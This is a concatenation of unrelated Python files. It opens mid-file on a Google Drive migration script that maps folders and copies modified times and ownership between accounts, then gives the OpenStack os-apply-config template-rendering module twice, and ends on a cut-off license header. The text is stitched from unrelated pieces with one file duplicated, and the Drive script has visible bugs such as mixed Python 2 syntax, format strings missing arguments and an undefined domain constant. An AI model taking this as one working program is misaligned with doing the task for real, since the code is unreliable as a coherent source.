    flags = argparse.ArgumentParser(parents=[tools.argparser]).parse_args()
except ImportError:
    flags = None

# If modifying these scopes, delete your previously saved credentials
# at ~/.credentials/drive-python-quickstart.json
SCOPES = 'https://www.googleapis.com/auth/drive'
CLIENT_SECRET_FILE = 'client_secret.json'
APPLICATION_NAME = 'Drive Migration Tool'

PATH_ROOT = 'D:'

class Drive():
    """ Google Drive representation class
    """
    def __init__(self, name, service):
        self.name = name
        self.folders = set()
        self.root = None
        self.files = set()
        self.users = set()
        self.service = service

        # Initialise the drive
        self.build_drive()
        print ("Generating paths for <{0}>.".format(self.name))
        self.generate_paths() # This is so expensive, needs optimisation
        print ("Finished generating paths for <{0}>.".format(self.name))

    def add_folder(self, folder):
        """ Add a folder to the drive
        """
        self.folders.add(folder)

    def add_file(self, file):
        """ Add a file to the drive
        """
        self.files.add(file)

    def parse_path(self, path):
        """ Parse a given file path, returning an ordered list of path objects
        """
        if PATH_ROOT not in path:
            print ("Invalid path <{0}>.".format(path))
            return None

        if path == PATH_ROOT:
            # We're looking at root
            return [self.root]

        # Strip out the prefix
        path = path.strip(PATH_ROOT)
        path_list = path.split('/')

        # Build the list of path objects
        path_objects = []
        curr_item = self.root
        for item in path_list:
            # Check the folders for matches
            for folder in self.folders:
                if curr_item.id in folder.parents and folder.name == item:
                    # Add the object to the list
                    # Set the current folder
                    curr_item = folder

                    # Add it to the list
                    path_objects.append(curr_item)

                    # Hope there aren't duplicates
                    break;

            # Check the files for matches
            for file in self.files:
                if curr_item.id in file.parents and file.name == item:
                    # Set the current file
                    curr_item = file

                    # Add the object to the list
                    path_objects.append(curr_item)

                    # Hope there aren't duplicates
                    break;

        if not any(obj.name == path_list[-1] for obj in path_objects) or len(path_objects) == 0:
            print ("Path <{0}> could not be found. Only found: <{1}>".format(PATH_ROOT+path, path_objects))
            for obj in path_objects:
                print (obj)
            return None

        # Return the path objects
        return path_objects

    def generate_paths(self, curr_item=None, curr_path=None):
        """ Generate all the paths for every file and folder in the drive - expensive
        """
        # Start in root
        if not curr_item:
            curr_item = self.root

        # Build folders first
        if not curr_path:
            curr_path = []

        for file in self.files:
            path_objects = list(curr_path)
            if curr_path:
                curr_item = path_objects[-1]

            if not file.path and curr_item.id in file.parents:
                path_string = curr_item.path + "/" + file.name
                # Build the path
                # path_objects.append(file)
                # path_string = self.build_path_string(path_objects)

                # Set the file path string
                file.set_path(path_string)

        for folder in self.folders:
            # Reset to the current path
            # print (curr_path)
            path_objects = list(curr_path)
            if curr_path:
                curr_item = path_objects[-1]

            if not folder.path and curr_item.id in folder.parents:
                path_string = curr_item.path + "/" + folder.name
                # Build the path
                # path_objects.append(folder)
                # path_string = self.build_path_string(path_objects)

                # Set the folder path string
                folder.set_path(path_string)

                # Generate children
                self.generate_paths(folder, path_objects)


    def build_path_string(self, path_objects):
        """ Build the path string from a given list of path_objects
        """ 
        path_string = PATH_ROOT
        end_index = len(path_objects) - 1

        for index, obj in enumerate(path_objects):
            if index == end_index:
                path_string = path_string + obj.name
            else:
                path_string = path_string + obj.name + "/"

        return path_string

    def build_path(self, file, return_string=False):
        """ Build the path to a given file
        """
        curr_item = file
        path_objects = []
        while curr_item != self.root:
            for folder in self.folders:
                if folder.id in curr_item.parents:
                    path_objects.insert(0, curr_item)
                    curr_item = folder

            print ("Path to <{0}> could not be built.".format(file.name))
            break;

        if return_string:
            self.build_path_string(path_objects)
        else:
            return path_objects

    def get_folder(self, name=None, id=None, parent=None):
        """ Get a folder by name or id
        """
        for folder in self.folders:
            if parent:
                parent_folder = self.get_folder(name=parent)
                if (folder.id == id or folder.name == name) and parent_folder.id in folder.parents:
                    return folder
            else:
                if folder.id == id or folder.name == name:
                    return folder

        print ("Could not find the folder with name: <{0}>, id: <{1}>, and parent: <{2}>. Aborting.".format(name, id, parent))
        return None

    def get_folders(self, name=None, id=None, parent_name=None):
        """ Get a list of folders which have a certain name
        """
        folder_set = set()
        for folder in self.folders:
            if parent_name:
                parent_folder = self.get_folder(name=parent_name)
                if (folder.id == id or folder.name == name) and parent_folder.id in folder.parents:
                    folder_set.add(folder)
            else:
                if folder.id == id or folder.name == name:
                    folder_set.add(folder)

        if len(folder_set) > 0:
            return folder_set
        else:
            print ("Could not find a folder with name: <{0}>, id: <{1}>, and parent: <{2}>. Aborting.".format(name, id, parent_name))
            sys.exit()

    def get_file(self, name=None, id=None, parent_name=None):
        """ Get a file by name or id
        """
        for file in self.files:
            if parent_name:
                possible_folders = self.get_folders(name=parent_name)
                for parent_folder in possible_folders:
                    if (file.id == id or file.name == name) and parent_folder.id in file.parents:
                        return file
            else:
                if file.id == id or file.name == name:
                    return file

        print ("Could not find the file with name: <{0}>, id: <{1}>, and parent: <{2}> in <{3}>.".format(name, id, parent_name, self.name))
        return None

    def print_drive(self, base_folder_path=PATH_ROOT, verbose=False, curr_folder=None, prefix=""):
        """ Print the drive structure from the given root folder
        """
        # If we're looking at the base folder, set it as the current folder
        if not curr_folder:
            path_objects = self.parse_path(base_folder_path)
            if not path_objects:
                # Will already have thrown error message
                sys.exit()
            else:
                curr_folder = path_objects[-1]

        # Print the current folder
        if curr_folder is self.root:
            print (prefix + curr_folder.id, curr_folder.name.encode('utf-8') + " ("+curr_folder.owner.name.encode('utf-8')+")")
        elif verbose:
            print (prefix + curr_folder.id, curr_folder.name.encode('utf-8') + " ("+curr_folder.owner.name.encode('utf-8')+")" + " ("+curr_folder.last_modified_time.encode('utf-8')+")" + " ("+curr_folder.last_modified_by.email.encode('utf-8')+")")
        else:
            print (prefix + curr_folder.name.encode('utf-8'))

        # Print file(s)
        for file in self.files:
            if curr_folder.id in file.parents:
                if verbose:
                    print (prefix + "\t" + file.id, file.name.encode('utf-8') + " ("+file.owner.name.encode('utf-8')+")" + " ("+file.last_modified_time.encode('utf-8')+")" + " ("+file.last_modified_by.email.encode('utf-8')+")")
                else:
                    print (prefix + "\t" + file.name.encode('utf-8'))

        # Print child folder(s)
        for folder in self.folders:
            if folder.parents:
                if curr_folder.id in folder.parents:
                    self.print_drive(verbose=verbose, curr_folder=folder, prefix=prefix+"\t")

    def get_user_emails(self):
        """ Get all user emails
        """
        emails = set()
        for user in self.users:
            emails.add(user.email)
        return emails

    def add_user(self, user):
        """ Add a user to the drive
        """
        # Only add the user if they don't already exist
        if user.email not in self.get_user_emails():
            self.users.add(user)

    def update_drive(self, src_drive, base_folder_path=None, parent=None, curr_folder=None):
        """ Update the owner and last known modified date for a file/folder
        """
        # If we don't have a current folder, get one
        if not curr_folder:
            if not base_folder_path:
                curr_folder = self.root
            else:
                curr_folder = src_drive.get_folder_via_path(base_folder_path)

        # Update files in current folder
        file_count = 0
        for file in src_drive.files:
            if curr_folder.id in file.parents:
                self.update_info(src_drive=src_drive, path=file.path)
                file_count += 1

        print ("Updated <{0}> files in folder <{1}> in <{2}> drive.".format(file_count, curr_folder.name, self.name))

        # Update sub-folders
        for folder in src_drive.folders:
            if curr_folder.id in folder.parents:
                result = self.update_drive(src_drive=src_drive, parent=curr_folder, curr_folder=folder)                    
                print (result)                    

    def get_file_via_path(self, path):
        """ Get a file via its path
        """
        for file in self.files:
            if file.path == path:
                return file

        print ("Could not find file at <{0}> in <{1}>.".format(path))                    

    def get_folder_via_path(self, path):
        """ Get a folder via its path
        """
        for folder in self.folders:
            if folder.path == path:
                return folder

        print ("Could not find folder at <{0}> in <{1}>.".format(path))                    

    def update_info(self, src_drive, path, update_owner=False):                    
        """ Update the supplied drive item with the last known modified date and owner for a given file
        """
        src_item = src_drive.get_file_via_path(path)                    
        dest_item = self.get_file_via_path(path)                    

        # Make sure both the source and destination files can be found
        if not src_item:
            return "Item could not be found in <{0}>. Skipping.".format(src_drive.name)
        if not dest_item:
            return "Item could not be found in <{0}>. Skipping.".format(self.name)

        try:
            # Build the updated payload
            time_body = {'modifiedTime': src_item.last_modified_time}

            # Send the file back
            time_response = self.service.files().update(fileId=dest_item.id, 
                                                        body=time_body
                                                        ).execute()

            if update_owner:
                # Get the new user email
                new_user = convert_to_new_domain(src_item.last_modified_by.email, NEW_DOMAIN)

                # Build the updated payload
                user_body = {'emailAddress': new_user,
                             'role': 'owner',
                             'type': 'user'}

                # Send the file back
                user_response = self.service.permissions().create(fileId=dest_item.id, 
                                                                  body=user_body,
                                                                  sendNotificationEmail=True,
                                                                  transferOwnership=True
                                                                  ).execute()

            return "Successfully updated <{0}> in drive <{1}>.".format(dest_item.name.encode('utf-8'), self.name)

        except errors.HttpError, error:
            print ("An error occurred: {0}".format(error))
            sys.exit()

    def build_drive(self):
        """ Build the Google drive for the given service
        """
        page_token = None
        page_no = 1
        print ("Retrieving drive data for <{0}>...".format(self.name))

        # Get the root "My Drive" folder first
        response = self.service.files().get(fileId='root',
                                            fields="id, mimeType, name, owners").execute()
        owner = User(name=response['owners'][0]['displayName'], email=response['owners'][0]['emailAddress'])
        root_folder = Folder(id=response['id'], 
                        name=response['name'], 
                        owner=owner, 
                        parents=None,
                        last_modified_time=None,
                        last_modified_by=None,
                        path=PATH_ROOT)
        self.root = root_folder

        # Get the rest of the drive
        while True:
            # Get entire folder structure, we'll work down from here
            response = self.service.files().list(q="trashed = false",
                                            pageSize=1000,
                                            pageToken=page_token,
                                            fields="nextPageToken, files(id, mimeType, name, owners, parents, modifiedTime, lastModifyingUser)").execute()
            results = response.get('files', [])

            # Build folder structure in memory
            for result in results:
                # Create owner
                owner = User(name=result['owners'][0]['displayName'], email=result['owners'][0]['emailAddress'])
                self.add_user(owner)

                # Save last modifying user, if it exists
                if 'emailAddress' in result['lastModifyingUser']:
                    modified_by = User(name=result['lastModifyingUser']['displayName'], email=result['lastModifyingUser']['emailAddress'])
                    self.add_user(modified_by)
                else:
                    modified_by = None

                # Check if it's a root folder
                if 'parents' in result:
                    parents = result['parents']
                else:
                    parents = 'root'

                # Create drive item
                if result['mimeType'] == 'application/vnd.google-apps.folder':
                    folder = Folder(id=result['id'], 
                                    name=result['name'], 
                                    owner=owner, 
                                    parents=parents,
                                    last_modified_time=result['modifiedTime'],
                                    last_modified_by=modified_by)
                    self.add_folder(folder)
                else:
                    file = File(id=result['id'], 
                                name=result['name'], 
                                owner=owner, 
                                parents=parents,
                                last_modified_time=result['modifiedTime'],
                                last_modified_by=modified_by,
                                mime_type=result['mimeType'])
                    self.add_file(file)

            # Look for more pages of results
            page_token = response.get('nextPageToken', None)
            page_no += 1
            if page_token is None:
                break;

        print ("Found <{0}> pages of results for <{1}>. Drive has been built.".format(page_no, self.name))

class User():
    """ User representation class
    """
    def __init__(self, name, email):
        self.name = name
        self.email = email

    def __repr__(self):
        return "<user: {0}>".format(self.email)

class File():
    """ File representation class
    """
    def __init__(self, id, name, owner, parents, last_modified_time, last_modified_by, mime_type):
        self.id = id
        self.name = name
        self.parents = parents
        self.owner = owner
        self.last_modified_time = last_modified_time
        self.last_modified_by = last_modified_by
        self.mime_type = mime_type

        self.path = None

    def __repr__(self):
        return "<file: {0}>".format(self.name)

    def set_path(self, path):
        """ Set the file path string
        """
        self.path = path

class Folder():
    """ Folder representation class
    """
    def __init__(self, id, name, owner, parents=None, last_modified_time=None, last_modified_by=None, path=None):
        self.id = id
        self.name = name
        self.parents = parents
        self.owner = owner
        self.last_modified_time = last_modified_time
        self.last_modified_by = last_modified_by

        self.path = path

    def __repr__(self):
        return "<folder: {0}>".format(self.name)

    def set_path(self, path):
        """ Set the folder path string
        """
        self.path = path

def convert_to_new_domain(email, new_domain):
    """ Convert a given email to a new domain
    """
    return email.split('@')[0].encode('utf-8')+'@'+new_domain

def get_credentials(src):
    """Gets valid user credentials from storage.

    If nothing has been stored, or if the stored credentials are invalid,
    the OAuth2 flow is completed to obtain the new credentials.

    Returns:
        Credentials, the obtained credential.
    """
    home_dir = os.path.expanduser('~')
    credential_dir = os.path.join(home_dir, '.credentials')
    if not os.path.exists(credential_dir):
        os.makedirs(credential_dir)
    if src == 'src':
        credential_path = os.path.join(credential_dir,
                                   'src-drive-migration-tool.json')
    else:
        credential_path = os.path.join(credential_dir,
                                   'dest-drive-migration-tool.json')

    store = Storage(credential_path)
    credentials = store.get()
    if not credentials or credentials.invalid:
        flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES)
        flow.user_agent = APPLICATION_NAME
        if flags:
            credentials = tools.run_flow(flow, store, flags)
        else: # Needed only for compatibility with Python 2.6
            credentials = tools.run(flow, store)
        print('Storing credentials to ' + credential_path)

    return credentials

def main():
    # Source account credentials
    src_credentials = get_credentials('src')
    src_http = src_credentials.authorize(httplib2.Http())
    src_service = discovery.build('drive', 'v3', http=src_http)

    # Destination account credentials
    dest_credentials = get_credentials('dest')
    dest_http = dest_credentials.authorize(httplib2.Http())
    dest_service = discovery.build('drive', 'v3', http=dest_http)

    src_drive = Drive("source drive", src_service)
    dest_drive = Drive("destination drive", dest_service)

    # Print the drive structure

    # Test updating file
    # parent = 'nov-16'
    # dest_drive.update_info(src_drive, fname, parent)

    # for folder in src_drive.folders:
    #     if folder.name == '2016-06':
    #         print (folder.id, folder.name, folder.path)

    # Test full drive update


if __name__ == '__main__':
    main()

# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import argparse
import json
import logging
import os
import subprocess
import sys
import tempfile

from pystache import context

from os_apply_config import collect_config
from os_apply_config import config_exception as exc
from os_apply_config import renderers
from os_apply_config import value_types
from os_apply_config import version

DEFAULT_TEMPLATES_DIR = '/usr/libexec/os-apply-config/templates'


def templates_dir():
    """Determine the default templates directory path

    If the OS_CONFIG_APPLIER_TEMPLATES environment variable has been set,
    use its value.
    Otherwise, select a default path based on which directories exist on the
    system, preferring the newer paths but still allowing the old ones for
    backwards compatibility.
    """
    templates_dir = os.environ.get('OS_CONFIG_APPLIER_TEMPLATES', None)
    if templates_dir is None:
        templates_dir = '/opt/stack/os-apply-config/templates'
        if not os.path.isdir(templates_dir):
            # Backwards compat with the old name.
            templates_dir = '/opt/stack/os-config-applier/templates'
        if (os.path.isdir(templates_dir) and
                not os.path.isdir(DEFAULT_TEMPLATES_DIR)):
            logging.warning('Template directory %s is deprecated.  The '
                            'recommended location for template files is %s',
                            templates_dir, DEFAULT_TEMPLATES_DIR)
        else:
            templates_dir = DEFAULT_TEMPLATES_DIR
    return templates_dir


TEMPLATES_DIR = templates_dir()
OS_CONFIG_FILES_PATH = os.environ.get(
    'OS_CONFIG_FILES_PATH', '/var/lib/os-collect-config/os_config_files.json')
OS_CONFIG_FILES_PATH_OLD = '/var/run/os-collect-config/os_config_files.json'


def install_config(
        config_path, template_root, output_path, validate, subhash=None,
        fallback_metadata=None):
    config = strip_hash(
        collect_config.collect_config(config_path, fallback_metadata), subhash)
    tree = build_tree(template_paths(template_root), config)
    if not validate:
        for path, contents in tree.items():
            write_file(os.path.join(
                output_path, strip_prefix('/', path)), contents)


def print_key(
        config_path, key, type_name, default=None, fallback_metadata=None):
    config = collect_config.collect_config(config_path, fallback_metadata)
    keys = key.split('.')
    for key in keys:
        try:
            config = config[key]
        except KeyError:                    
            if default is not None:
                print(str(default))
                return
            else:
                raise exc.ConfigException(
                    'key %s does not exist in %s' % (key, config_path))
    value_types.ensure_type(str(config), type_name)
    print(str(config))


def write_file(path, contents):
    logger.info("writing %s", path)
    if os.path.exists(path):
        stat = os.stat(path)
        mode, uid, gid = stat.st_mode, stat.st_uid, stat.st_gid
    else:
        mode, uid, gid = 0o644, -1, -1
    d = os.path.dirname(path)
    os.path.exists(d) or os.makedirs(d)
    with tempfile.NamedTemporaryFile(dir=d, delete=False) as newfile:
        newfile.write(contents)
        os.chmod(newfile.name, mode)
        os.chown(newfile.name, uid, gid)
        os.rename(newfile.name, path)

# return a map of filenames->filecontents


def build_tree(templates, config):
    res = {}
    for in_file, out_file in templates:
        res[out_file] = render_template(in_file, config)
    return res


def render_template(template, config):
    if is_executable(template):
        return render_executable(template, config)
    else:
        try:
            return render_moustache(open(template).read(), config)
        except context.KeyNotFoundError as e:
            raise exc.ConfigException(
                "key '%s' from template '%s' does not exist in metadata file."
                % (e.key, template))
        except Exception as e:
            logger.error("%s", e)
            raise exc.ConfigException(
                "could not render moustache template %s" % template)


def is_executable(path):
    return os.path.isfile(path) and os.access(path, os.X_OK)


def render_moustache(text, config):
    r = renderers.JsonRenderer(missing_tags='ignore')
    return r.render(text, config)


def render_executable(path, config):
    p = subprocess.Popen([path],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    stdout, stderr = p.communicate(json.dumps(config))
    p.wait()
    if p.returncode != 0:
        raise exc.ConfigException(
            "config script failed: %s\n\nwith output:\n\n%s" %
            (path, stdout + stderr))
    return stdout


def template_paths(root):
    res = []
    for cur_root, _subdirs, files in os.walk(root):
        for f in files:
            inout = (os.path.join(cur_root, f), os.path.join(
                strip_prefix(root, cur_root), f))
            res.append(inout)
    return res


def strip_prefix(prefix, s):
    return s[len(prefix):] if s.startswith(prefix) else s


def strip_hash(h, keys):
    if not keys:
        return h
    for k in keys.split('.'):
        if k in h and isinstance(h[k], dict):
            h = h[k]
        else:
            raise exc.ConfigException(
                "key '%s' does not correspond to a hash in the metadata file"
                % keys)
    return h


def parse_opts(argv):
    parser = argparse.ArgumentParser(
        description='Reads and merges JSON configuration files specified'
        ' by colon separated environment variable OS_CONFIG_FILES, unless'
        ' overridden by command line option --metadata. If no files are'
        ' specified this way, falls back to legacy behavior of searching'
        ' the fallback metadata path for a single config file.')
    parser.add_argument('-t', '--templates', metavar='TEMPLATE_ROOT',
                        help="""path to template root directory (default:
                        %(default)s)""",
                        default=TEMPLATES_DIR)
    parser.add_argument('-o', '--output', metavar='OUT_DIR',
                        help='root directory for output (default:%(default)s)',
                        default='/')
    parser.add_argument('-m', '--metadata', metavar='METADATA_FILE', nargs='*',
                        help='Overrides environment variable OS_CONFIG_FILES.'
                        ' Specify multiple times, rather than separate files'
                        ' with ":".',
                        default=[])
    parser.add_argument('--fallback-metadata', metavar='FALLBACK_METADATA',
                        nargs='*', help='Files to search when OS_CONFIG_FILES'
                        ' is empty. (default: %(default)s)',
                        default=['/var/cache/heat-cfntools/last_metadata',
                                 '/var/lib/heat-cfntools/cfn-init-data',
                                 '/var/lib/cloud/data/cfn-init-data'])
    parser.add_argument(
        '-v', '--validate', help='validate only. do not write files',
        default=False, action='store_true')
    parser.add_argument(
        '--print-templates', default=False, action='store_true',
        help='Print templates root and exit.')
    parser.add_argument('-s', '--subhash',
                        help='use the sub-hash named by this key,'
                             ' instead of the full metadata hash')
    parser.add_argument('--key', metavar='KEY', default=None,
                        help='print the specified key and exit.'
                             ' (may be used with --type and --key-default)')
    parser.add_argument('--type', default='default',
                        help='exit with error if the specified --key does not'
                             ' match type. Valid types are'
                             ' <int|default|netaddress|netdevice|dsn|'
                             'swiftdevices|raw>')
    parser.add_argument('--key-default',
                        help='This option only affects running with --key.'
                             ' Print this if key is not found. This value is'
                             ' not subject to type restrictions. If --key is'
                             ' specified and no default is specified, program'
                             ' exits with an error on missing key.')
    parser.add_argument('--version', action='version',
                        version=version.version_info.version_string())
    parser.add_argument('--os-config-files',
                        default=OS_CONFIG_FILES_PATH,
                        help='Set path to os_config_files.json')
    opts = parser.parse_args(argv[1:])

    return opts


def load_list_from_json(json_file):
    json_obj = []
    if os.path.exists(json_file):
        with open(json_file) as ocf:
            json_obj = json.loads(ocf.read())
    if not isinstance(json_obj, list):
        raise ValueError("No list defined in json file: %s" % json_file)
    return json_obj


def main(argv=sys.argv):
    opts = parse_opts(argv)
    if opts.print_templates:
        print(opts.templates)
        return 0

    if not opts.metadata:
        if 'OS_CONFIG_FILES' in os.environ:
            opts.metadata = os.environ['OS_CONFIG_FILES'].split(':')
        else:
            opts.metadata = load_list_from_json(opts.os_config_files)
            if ((not opts.metadata and opts.os_config_files ==
                 OS_CONFIG_FILES_PATH)):
                logger.warning('DEPRECATED: falling back to %s' %
                               OS_CONFIG_FILES_PATH_OLD)
                opts.metadata = load_list_from_json(OS_CONFIG_FILES_PATH_OLD)

    try:
        if opts.templates is None:
            raise exc.ConfigException('missing option --templates')

        if opts.key:
            print_key(opts.metadata,
                      opts.key,
                      opts.type,
                      opts.key_default,
                      opts.fallback_metadata)
        else:
            install_config(opts.metadata, opts.templates, opts.output,
                           opts.validate, opts.subhash, opts.fallback_metadata)
            logger.info("success")
    except exc.ConfigException as e:
        logger.error(e)
        return 1
    return 0


# logging
LOG_FORMAT = '[%(asctime)s] [%(levelname)s] %(message)s'
DATE_FORMAT = '%Y/%m/%d %I:%M:%S %p'


def add_handler(logger, handler):
    handler.setFormatter(logging.Formatter(LOG_FORMAT, datefmt=DATE_FORMAT))
    logger.addHandler(handler)
logger = logging.getLogger('os-apply-config')
logger.setLevel(logging.INFO)
add_handler(logger, logging.StreamHandler())
if os.geteuid() == 0:
    add_handler(logger, logging.FileHandler('/var/log/os-apply-config.log'))

if __name__ == '__main__':
    sys.exit(main(sys.argv))

# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
# implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import argparse
import json
import logging
import os
import subprocess
import sys
import tempfile

from pystache import context

from os_apply_config import collect_config
from os_apply_config import config_exception as exc
from os_apply_config import renderers
from os_apply_config import value_types
from os_apply_config import version

DEFAULT_TEMPLATES_DIR = '/usr/libexec/os-apply-config/templates'


def templates_dir():
    """Determine the default templates directory path

    If the OS_CONFIG_APPLIER_TEMPLATES environment variable has been set,
    use its value.
    Otherwise, select a default path based on which directories exist on the
    system, preferring the newer paths but still allowing the old ones for
    backwards compatibility.
    """
    templates_dir = os.environ.get('OS_CONFIG_APPLIER_TEMPLATES', None)
    if templates_dir is None:
        templates_dir = '/opt/stack/os-apply-config/templates'
        if not os.path.isdir(templates_dir):
            # Backwards compat with the old name.
            templates_dir = '/opt/stack/os-config-applier/templates'
        if (os.path.isdir(templates_dir) and
                not os.path.isdir(DEFAULT_TEMPLATES_DIR)):
            logging.warning('Template directory %s is deprecated.  The '
                            'recommended location for template files is %s',
                            templates_dir, DEFAULT_TEMPLATES_DIR)
        else:
            templates_dir = DEFAULT_TEMPLATES_DIR
    return templates_dir


TEMPLATES_DIR = templates_dir()
OS_CONFIG_FILES_PATH = os.environ.get(
    'OS_CONFIG_FILES_PATH', '/var/lib/os-collect-config/os_config_files.json')
OS_CONFIG_FILES_PATH_OLD = '/var/run/os-collect-config/os_config_files.json'


def install_config(
        config_path, template_root, output_path, validate, subhash=None,
        fallback_metadata=None):
    config = strip_hash(
        collect_config.collect_config(config_path, fallback_metadata), subhash)
    tree = build_tree(template_paths(template_root), config)
    if not validate:
        for path, contents in tree.items():
            write_file(os.path.join(
                output_path, strip_prefix('/', path)), contents)


def print_key(
        config_path, key, type_name, default=None, fallback_metadata=None):
    config = collect_config.collect_config(config_path, fallback_metadata)
    keys = key.split('.')
    for key in keys:
        try:
            config = config[key]
        except KeyError:                    
            if default is not None:
                print(str(default))
                return
            else:
                raise exc.ConfigException(
                    'key %s does not exist in %s' % (key, config_path))
    value_types.ensure_type(str(config), type_name)
    print(str(config))


def write_file(path, contents):
    logger.info("writing %s", path)
    if os.path.exists(path):
        stat = os.stat(path)
        mode, uid, gid = stat.st_mode, stat.st_uid, stat.st_gid
    else:
        mode, uid, gid = 0o644, -1, -1
    d = os.path.dirname(path)
    os.path.exists(d) or os.makedirs(d)
    with tempfile.NamedTemporaryFile(dir=d, delete=False) as newfile:
        newfile.write(contents)
        os.chmod(newfile.name, mode)
        os.chown(newfile.name, uid, gid)
        os.rename(newfile.name, path)

# return a map of filenames->filecontents


def build_tree(templates, config):
    res = {}
    for in_file, out_file in templates:
        res[out_file] = render_template(in_file, config)
    return res


def render_template(template, config):
    if is_executable(template):
        return render_executable(template, config)
    else:
        try:
            return render_moustache(open(template).read(), config)
        except context.KeyNotFoundError as e:
            raise exc.ConfigException(
                "key '%s' from template '%s' does not exist in metadata file."
                % (e.key, template))
        except Exception as e:
            logger.error("%s", e)
            raise exc.ConfigException(
                "could not render moustache template %s" % template)


def is_executable(path):
    return os.path.isfile(path) and os.access(path, os.X_OK)


def render_moustache(text, config):
    r = renderers.JsonRenderer(missing_tags='ignore')
    return r.render(text, config)


def render_executable(path, config):
    p = subprocess.Popen([path],
                         stdin=subprocess.PIPE,
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
    stdout, stderr = p.communicate(json.dumps(config))
    p.wait()
    if p.returncode != 0:
        raise exc.ConfigException(
            "config script failed: %s\n\nwith output:\n\n%s" %
            (path, stdout + stderr))
    return stdout


def template_paths(root):
    res = []
    for cur_root, _subdirs, files in os.walk(root):
        for f in files:
            inout = (os.path.join(cur_root, f), os.path.join(
                strip_prefix(root, cur_root), f))
            res.append(inout)
    return res


def strip_prefix(prefix, s):
    return s[len(prefix):] if s.startswith(prefix) else s


def strip_hash(h, keys):
    if not keys:
        return h
    for k in keys.split('.'):
        if k in h and isinstance(h[k], dict):
            h = h[k]
        else:
            raise exc.ConfigException(
                "key '%s' does not correspond to a hash in the metadata file"
                % keys)
    return h


def parse_opts(argv):
    parser = argparse.ArgumentParser(
        description='Reads and merges JSON configuration files specified'
        ' by colon separated environment variable OS_CONFIG_FILES, unless'
        ' overridden by command line option --metadata. If no files are'
        ' specified this way, falls back to legacy behavior of searching'
        ' the fallback metadata path for a single config file.')
    parser.add_argument('-t', '--templates', metavar='TEMPLATE_ROOT',
                        help="""path to template root directory (default:
                        %(default)s)""",
                        default=TEMPLATES_DIR)
    parser.add_argument('-o', '--output', metavar='OUT_DIR',
                        help='root directory for output (default:%(default)s)',
                        default='/')
    parser.add_argument('-m', '--metadata', metavar='METADATA_FILE', nargs='*',
                        help='Overrides environment variable OS_CONFIG_FILES.'
                        ' Specify multiple times, rather than separate files'
                        ' with ":".',
                        default=[])
    parser.add_argument('--fallback-metadata', metavar='FALLBACK_METADATA',
                        nargs='*', help='Files to search when OS_CONFIG_FILES'
                        ' is empty. (default: %(default)s)',
                        default=['/var/cache/heat-cfntools/last_metadata',
                                 '/var/lib/heat-cfntools/cfn-init-data',
                                 '/var/lib/cloud/data/cfn-init-data'])
    parser.add_argument(
        '-v', '--validate', help='validate only. do not write files',
        default=False, action='store_true')
    parser.add_argument(
        '--print-templates', default=False, action='store_true',
        help='Print templates root and exit.')
    parser.add_argument('-s', '--subhash',
                        help='use the sub-hash named by this key,'
                             ' instead of the full metadata hash')
    parser.add_argument('--key', metavar='KEY', default=None,
                        help='print the specified key and exit.'
                             ' (may be used with --type and --key-default)')
    parser.add_argument('--type', default='default',
                        help='exit with error if the specified --key does not'
                             ' match type. Valid types are'
                             ' <int|default|netaddress|netdevice|dsn|'
                             'swiftdevices|raw>')
    parser.add_argument('--key-default',
                        help='This option only affects running with --key.'
                             ' Print this if key is not found. This value is'
                             ' not subject to type restrictions. If --key is'
                             ' specified and no default is specified, program'
                             ' exits with an error on missing key.')
    parser.add_argument('--version', action='version',
                        version=version.version_info.version_string())
    parser.add_argument('--os-config-files',
                        default=OS_CONFIG_FILES_PATH,
                        help='Set path to os_config_files.json')
    opts = parser.parse_args(argv[1:])

    return opts


def load_list_from_json(json_file):
    json_obj = []
    if os.path.exists(json_file):
        with open(json_file) as ocf:
            json_obj = json.loads(ocf.read())
    if not isinstance(json_obj, list):
        raise ValueError("No list defined in json file: %s" % json_file)
    return json_obj


def main(argv=sys.argv):
    opts = parse_opts(argv)
    if opts.print_templates:
        print(opts.templates)
        return 0

    if not opts.metadata:
        if 'OS_CONFIG_FILES' in os.environ:
            opts.metadata = os.environ['OS_CONFIG_FILES'].split(':')
        else:
            opts.metadata = load_list_from_json(opts.os_config_files)
            if ((not opts.metadata and opts.os_config_files ==
                 OS_CONFIG_FILES_PATH)):
                logger.warning('DEPRECATED: falling back to %s' %
                               OS_CONFIG_FILES_PATH_OLD)
                opts.metadata = load_list_from_json(OS_CONFIG_FILES_PATH_OLD)

    try:
        if opts.templates is None:
            raise exc.ConfigException('missing option --templates')

        if opts.key:
            print_key(opts.metadata,
                      opts.key,
                      opts.type,
                      opts.key_default,
                      opts.fallback_metadata)
        else:
            install_config(opts.metadata, opts.templates, opts.output,
                           opts.validate, opts.subhash, opts.fallback_metadata)
            logger.info("success")
    except exc.ConfigException as e:
        logger.error(e)
        return 1
    return 0


# logging
LOG_FORMAT = '[%(asctime)s] [%(levelname)s] %(message)s'
DATE_FORMAT = '%Y/%m/%d %I:%M:%S %p'


def add_handler(logger, handler):
    handler.setFormatter(logging.Formatter(LOG_FORMAT, datefmt=DATE_FORMAT))
    logger.addHandler(handler)
logger = logging.getLogger('os-apply-config')
logger.setLevel(logging.INFO)
add_handler(logger, logging.StreamHandler())
if os.geteuid() == 0:
    add_handler(logger, logging.FileHandler('/var/log/os-apply-config.log'))

if __name__ == '__main__':
    sys.exit(main(sys.argv))

# Copyright (c) 2013 Hewlett-Packard Development Company, L.P.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
